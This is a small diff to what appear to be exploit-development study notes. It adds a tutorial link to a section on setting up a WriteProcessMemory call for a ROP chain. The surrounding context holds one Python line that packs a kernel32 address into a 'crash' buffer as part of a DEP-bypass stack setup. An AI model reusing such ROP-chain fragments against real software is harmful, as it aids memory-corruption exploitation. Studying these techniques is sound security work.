@@ -81,7 +81,7 @@ Alternative: Use Pykd code caver: https://github.com/nop-tech/code_caver
 ```
 
 # Stack set-ups
-WriteProcessMemory:
+WriteProcessMemory: https://connormcgarr.github.io/ROP2/
 ```
 # kernel32!WriteProcessMemory placeholder parameters
 crash += struct.pack('<L', 0x61c832e4)    # Pointer to kernel32!WriteFileImplementation (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
